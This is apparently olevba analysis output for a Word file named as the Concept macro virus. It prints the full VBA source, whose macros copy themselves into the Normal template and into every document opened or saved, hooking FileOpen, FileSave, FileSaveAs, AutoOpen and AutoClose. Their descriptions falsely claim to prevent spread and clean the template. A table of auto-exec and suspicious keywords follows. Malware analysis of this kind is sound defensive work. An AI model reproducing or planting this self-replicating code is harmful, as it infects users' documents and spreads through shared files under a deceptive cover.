olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DNTC.bas 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/DNTC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
 sMe$ = WordBasic.[FileName$]()
 sMacro$ = sMe$ + ":AutoOpen"
 WordBasic.MacroCopy sMacro$, "Global:DNTC"
 sMacro$ = sMe$ + ":FS"
 WordBasic.MacroCopy sMacro$, "Global:FileSave"
 sMacro$ = sMe$ + ":FSA"
 WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
 sMacro$ = sMe$ + ":FO"
 WordBasic.MacroCopy sMacro$, "Global:FileOpen"
 sMacro$ = sMe$ + ":AC"
 WordBasic.MacroCopy sMacro$, "Global:AutoClose"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FSA.MAIN"
Dim sMe$
Dim sMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Pass
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:DNTC", sMacro$
sMacro$ = sMe$ + ":FSA"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
sMacro$ = sMe$ + ":FS"
WordBasic.MacroCopy "Global:FileSave", sMacro$
sMacro$ = sMe$ + ":AC"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":FO"
WordBasic.MacroCopy "Global:FileOpen", sMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Pass:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FO.MAIN"
Dim iMacroCount
Dim Installed
Dim i
Dim sMe$
Dim sMacro$
WordBasic.DisableAutoMacros
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo Done
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
iMacroCount = WordBasic.CountMacros(1)
Installed = 0
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Or WordBasic.[MacroName$](i, 1) = "FS" Or WordBasic.[MacroName$](i, 1) = "FSA" Or WordBasic.[MacroName$](i, 1) = "FO" Or WordBasic.[MacroName$](i, 1) = "AC" Then
        Installed = Installed + 1
    End If
Next i
If Installed = 5 Then
 WordBasic.ToolsMacro Name:="AutoOpen", Run:=1
ElseIf Not Installed = 5 Then
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:DNTC", sMacro$
sMacro$ = sMe$ + ":FSA"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
sMacro$ = sMe$ + ":FS"
WordBasic.MacroCopy "Global:FileSave", sMacro$
sMacro$ = sMe$ + ":AC"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":FO"
WordBasic.MacroCopy "Global:FileOpen", sMacro$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
End If
Done:
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Concept.bc-84953242af51220afa9228cae4b22feb1dc197fc - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AC.MAIN"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

